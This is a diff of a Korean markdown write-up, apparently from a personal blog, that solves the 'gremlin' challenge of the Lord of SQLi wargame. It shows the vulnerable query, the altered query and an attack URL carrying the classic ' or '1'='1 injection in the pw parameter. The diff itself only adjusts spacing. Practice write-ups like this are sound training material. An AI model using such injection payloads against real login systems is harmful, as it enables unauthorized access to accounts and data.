@@ -15,22 +15,29 @@ draft: false
 ---
 
 ## **Solve**
-- **기존 구문 →GET 방식**
+
+- **기존 구문 → GET 방식**
 
 ```
+
 select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}’
+
 ```
 
 - **변경 구문**
 
 ```
+
 select id from prob_gremlin where id='admin' and pw='admin' or '1'='1#’
+
 ```
 
 - **공격 구문**
 
 ```
+
 https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=admin&pw=admin' or '1'='1
+
 ```
 
 ---
